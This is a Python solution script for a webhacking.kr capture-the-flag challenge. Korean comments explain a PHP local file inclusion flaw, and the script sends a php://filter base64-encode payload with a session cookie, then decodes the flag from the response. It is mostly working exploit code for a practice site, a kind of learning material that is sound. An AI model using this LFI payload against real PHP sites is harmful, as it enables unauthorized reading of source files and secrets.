from bs4 import BeautifulSoup
import base64
import requests

URL = "http://webhacking.kr:10001"
URI = "/?file=php://filter/convert.base64-encode/resource=flag"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

cookie = {'PHPSESSID':PHPSESSID}

# 풀이
# 1. PHP의 LFI 취약점을 활용한 공격으로 본 문제에서는 ?file= 위치에 파일 명을 전달하면 코드가 실행됨
# 2. 이때 실행되는 방식은 fread(파일 데이터, 1) 형식으로 들어가는 파일 데이터가 코드로 실행되는 방식
# 3. 이 부분을 악용해서 '파일 데이터' 부분에 PHP 레퍼를 삽입하면 코드처럼 실행 가능
# 4. PHP 레퍼 중 filter를 이용해서 문자열 가공 후 다시 해석하면 플래그 획득 가능

resp = requests.get(URL + URI, cookies=cookie)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('textarea').contents[0]
FLAG = base64.b64decode(FLAG).decode('utf-8')

s_idx = FLAG.find("FLAG{")
e_idx = FLAG.find("}") + 1

FLAG = FLAG[s_idx:e_idx]

print(FLAG)